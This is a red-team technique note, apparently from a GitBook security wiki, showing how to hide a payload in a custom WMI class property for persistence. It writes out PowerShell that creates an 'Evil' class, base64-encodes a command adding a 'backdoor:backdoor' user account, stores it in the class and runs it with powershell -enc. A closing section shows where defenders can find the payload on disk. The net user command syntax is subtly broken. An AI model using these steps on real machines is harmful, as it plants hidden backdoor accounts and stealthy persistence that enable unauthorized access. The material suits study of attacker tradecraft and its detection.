---
description: >-
  Exploring WMI as a data storage for persistence by leveraging WMI classes and
  their properties.
---

# WMI as a Data Storage

## WMI as a Data Storage

### Execution

Creating a new WMI class with a property `EvilProperty` that will later store the payload to be executed:

```csharp
$evilClass = New-Object management.managementclass('root\cimv2',$null,$null)
$evilClass.Name = "Evil"
$evilClass.Properties.Add('EvilProperty','Tis notin good sir')
$evilClass.Put()

Path          : \\.\root\cimv2:Evil
RelativePath  : Evil
Server        : .
NamespacePath : root\cimv2
ClassName     : Evil
IsClass       : True
IsInstance    : False
IsSingleton   : False
```

We can see the `Evil` class properties:

```csharp
([wmiclass] 'Evil').Properties

Name       : EvilProperty
Value      : Tis notin good sir
Type       : String
IsLocal    : True
IsArray    : False
Origin     : Evil
Qualifiers : {CIMTYPE}
```

Checking WMI Explorer shows the new `Evil` class has been created under the `root\cimv2` namepace - note the `EvilProperty` can also be observed:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJGCmhQCDLjGuX-gYZg%2F-LJGDHLcRwH2_USboI04%2Fwmi-data-storage-newclass.png?alt=media\&token=491c9538-a5db-4a95-bb73-7626b6d1163a)

#### Storing Payload

For storing the payload inside the `EvilProperty`, let's create a base64 encoded powershell command that adds a backdoor user with credentials `backdoor:backdoor`:

```csharp
$command = "cmd '/c net user add backdoor backdoor /add'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# $encodedCommand = YwBtAGQAIAAvAGMAIAAnAG4AZQB0ACAAdQBzAGUAcgAgAGIAYQBjAGsAZABvAG8AcgAgAGIAYQBjAGsAZABvAG8AcgAgAC8AYQBkAGQAJwA=
```

Updating `EvilProperty` attribute to store `$encodedCommand`:

```csharp
$evilClass.Properties.Add('EvilProperty', $encodedCommand)
```

Below is the same as above, just in a screenshot:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJKkWnpNfolnDGzpIGq%2F-LJKsvXJOeiKbQsE_yuD%2Fwim-setting-payload.png?alt=media\&token=c82730f1-7c14-4a82-add8-5edd2576c1c6)

#### Real Execution

```csharp
powershell.exe -enc $evilClass.Properties['EvilProperty'].Value
```

Executing the payload stored in the property of a WMI class's property - note that the backdoor user has been successfully added:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJKkWnpNfolnDGzpIGq%2F-LJKsvXDzgtbbJ1BKYbU%2Fwmi-payload-executed.png?alt=media\&token=d0fe0c0e-8195-4955-9f82-040d9140a3e2)

If we commit the `$evilClass` with its `.Put()` method, our payload will get stored permanently in the WMI Class. Note how a new "Evil" class' properties member shows the payload we have commited:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJKtxkDbXuuUXyFQjnM%2F-LJKtuN2Jt92bkQvQS9w%2Fwmi-payload-commited.png?alt=media\&token=2bf12448-b1f8-4144-88d3-8e82210a8664)

### Observations

Using the WMI Explorer, we can inspect the class' definition which is stored in`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`

The file contains all the classes and other relevant information about those classes. In our case, we can see the `EvilProperty` with our malicious payload inside:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJKvEBUs2IU9CEstLnY%2F-LJKvAiTYiPrx58Ikf1i%2Fwmi-evil-mof.png?alt=media\&token=ec2a72b0-45b5-490b-ae6f-09c8ed1e4af7)

When inspecting the OBJECTS.DATA with a hex editor, it is possible (although not very practical nor user friendly) to find the same data - note that the screenshot is referring to the state of the Evil class at the very beginning of its creation as this is when I took the screenshot:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJKvEBUs2IU9CEstLnY%2F-LJL-WE0Tqtb4moRPiAY%2Fwmi-objects-data.png?alt=media\&token=020c0b8e-8870-498e-b639-5875ed6469f2)
